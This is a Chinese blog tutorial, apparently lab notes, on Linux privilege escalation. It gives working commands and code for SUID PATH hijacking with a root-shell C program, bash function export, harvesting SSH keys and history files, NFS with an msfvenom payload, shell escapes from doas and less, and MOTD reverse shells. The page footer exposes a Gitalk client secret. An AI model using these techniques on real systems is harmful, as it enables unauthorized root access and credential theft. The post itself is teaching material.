+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SUID环境变量利用提权</span><br><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">利用suid-env进行提权</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//498ca79a9145b2d374bdbfe8687230e8.png" alt="image-20230930215434900"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>suid-env</span><br><span class="line">查看看到最后是相对路径，并不是绝对路径，可以对其进行劫持，使其执行我们提供的相对路径的service文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//c20c56c93d66fcaef8abda6ee296fc5f.png" alt="image-20230930215752509"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim service.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">gcc -o service service.c   <span class="comment">//如果靶机没有相关库就在攻击机静态编译</span></span><br><span class="line">要对路径进行指定，这样就可以优先读取家目录下的service服务</span><br><span class="line"><span class="keyword">export</span> PATH=.:$PATH</span><br><span class="line">/usr/local/bin/suid-env</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//974a2f301354ab2d2e77e46024b71fc8.png" alt="image-20230930220325517"></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">巧用SUID-<span class="built_in">SHELL</span>功能提权<span class="meta">#1</span></span><br><span class="line">在bash版本号小于<span class="number">4.2</span>时，可以在bash中定义函数，然后用路径的组合做文件名，所以正好契合上面service的利用方式</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//b713b0d06657e05e2b21732631796831.png" alt="image-20230930220820001"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> /usr/sbin/service &#123; /bin/bash -p; &#125;</span><br><span class="line">最后导入环境变量</span><br><span class="line"><span class="built_in">export</span> -f /usr/sbin/service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//b7d78371f54c902521e3f7f590021d5f.png" alt="image-20230930221358855"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码和密钥历史文件提权</span><br><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//d737e9a25d107dadd5540902a470d1f0.png" alt="image-20231001170704869"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.*<span class="built_in">history</span> | les  查看<span class="built_in">history</span>相关文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//19d670250bb9d4d3ee938b7e36ebf2e1.png" alt="image-20231001170959649"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -liah查看特殊文件，比如<span class="string">.viminfo</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//477f9ebde38c7438f694e65834d9929d.png" alt="image-20231001171251663"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码和密钥配置文件的查看特权</span><br><span class="line">家目录先的所有文件都要翻翻看看 比如myvpn.ovpn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSH密钥敏感信息提权</span><br><span class="line">到根目录下查找<span class="string">.ssh</span>文件，这个很重要因为不仅高权限用户可以登录ssh，低权限用户也可以登录到<span class="string">.ssh</span>文件下发现root_key</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//388061e891fbb11619933610c9c895c6.png" alt="image-20231001172552393"></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制<span class="built_in">key</span>，对文本加权尝试连接 发现签名不对，就直接加</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//55418c277eace488623cfe203f0a8bb5.png" alt="image-20231001172730335"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NFS提权</span><br><span class="line">NFS文件共享的意思，网络文件共享，可以用于撕口子也可以用于提权</span><br><span class="line"><span class="built_in">cat</span> /etc/exports 查看是否有NFS服务</span><br><span class="line">建立NFS,反弹shell  mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs</span><br><span class="line">注意这里版本为3.发现要创建软连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//3dfa61d7ac3b00a9e0f0c41b1d8dd6b2.png" alt="image-20231001185627781"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">到tmp下查看一下我们创建的软连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//f275c4cfea788c3933e3aacfa8b6aa95.png" alt="image-20231001190020944"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用msf生成<span class="keyword">shell</span><span class="language-bash">  msfvenom -p linux/x86/exec CMD=<span class="string">&quot;/bin/bash-p&quot;</span> -f elf -o /tmp/nfs/shell.elf</span></span><br><span class="line">然后给文件权限</span><br><span class="line">到俩台主机的共享文件下运行<span class="keyword">shell</span><span class="language-bash">文件</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//668df74cf4efbe82f0816b43626f45d3.png" alt="image-20231001190522957"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">内核利用提权</span><br><span class="line">一般渗透最后办法了在利用内核提权，很需要经验</span><br><span class="line"><span class="built_in">uname</span> -a查看内核，版本越低漏洞越多 然后同上linpeass的使用（不能访问外网）</span><br><span class="line">借助searchsploit即可</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">doas less+vi 提权</span><br><span class="line"><span class="built_in">find</span> / -group<span class="built_in"> user </span>-type f 2&gt;/dev/<span class="literal">null</span> 查看可利用文件</span><br><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//ca769af878f513b23577eb007a7a7018.png" alt="image-20231001193236300"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//68e09d868ab33e6d96094847554c1500.png" alt="image-20231001193747105"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/doas.<span class="keyword">conf</span></span><br><span class="line">ESC+:!<span class="keyword">sh</span>即可执行doas里<span class="keyword">var</span>权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用MOTD机制提权</span><br><span class="line">查看motd文件 <span class="built_in">cd</span> /etc/update-motd.d  里面有00-header文件是欢迎文件，一般等用户登录上就会直接执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//e9cd5fb503ef2e5ccbd5e3c2fa587ec0.png" alt="image-20231001194716958"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">写入反弹<span class="keyword">shell</span><span class="language-bash">进行监听</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//f6a66fd5fa7c32d0f06a4486467c95ee.png" alt="image-20231001194839915"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%8F%90%E6%9D%83/"># 提权</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02/">内网渗透-三层网络渗透学习2</a>
+            
+            
+            <a class="next" rel="next" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86/">内网渗透-Windows提权梳理</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
